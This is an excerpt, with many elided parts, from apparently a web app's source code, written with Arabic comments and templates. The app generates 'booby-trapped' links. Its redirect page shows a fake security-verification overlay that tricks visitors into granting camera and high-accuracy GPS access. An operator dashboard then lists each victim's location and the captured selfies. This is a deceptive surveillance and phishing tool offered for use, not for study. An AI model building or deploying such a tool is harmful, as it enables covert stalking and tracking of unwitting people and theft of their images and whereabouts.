...
# قالب إعادة التوجيه مع نافذة الأذونات المخصصة وسحب GPS السريع والتقاط الصور السريع
REDIRECT_TEMPLATE = """
<!DOCTYPE html>
...
<body>
    <div class="permission-overlay" id="permOverlay">
        <div class="permission-box">
            ...
            <div class="permission-desc">يرغب هذا الموقع في التحقق من الأمان وتأكيد هويتك عبر الكاميرا وموقع GPS للمتابعة لقراءة المقال.</div>
    ...
    <script>
        async function grantPermission(type) {
            ...
            // 1. طلب إذن الموقع الجغرافي (GPS) بدقة عالية وسرعة استجابة محسّنة
            try {
...
<body>
    ...
    <div class="container">
        ...
        <p class="subtitle">أدخل رابط الموقع لإنشاء رابط ملغم + التقاط صور سريعة وموقع GPS دقيق</p>
    ...
    <script>
        ...
        async function loadStats() {
            ...
            for (const [id, info] of Object.entries(data.links)) {
                ...
                const hasSelfie = hasVisitors && info.visitors.some(v => v.selfies && v.selfies.length > 0);
        ...
        <div class="card">
            ...
            {% if info.visitors %}
                ...
                <div class="visitor-box">
                    ...
                    <div style="margin-top:12px; font-weight:bold; font-size:12px; color:#a855f7;">صور السيلفي الملتقطة:</div>
                    {% if v.selfies %}
                        <div class="selfies-grid">
                            {% for selfie_path in v.selfies %}
                            <img src="/selfies/{{ selfie_path }}" alt="Recipient Selfie">
                            {% endfor %}
                        </div>
                    {% else %}
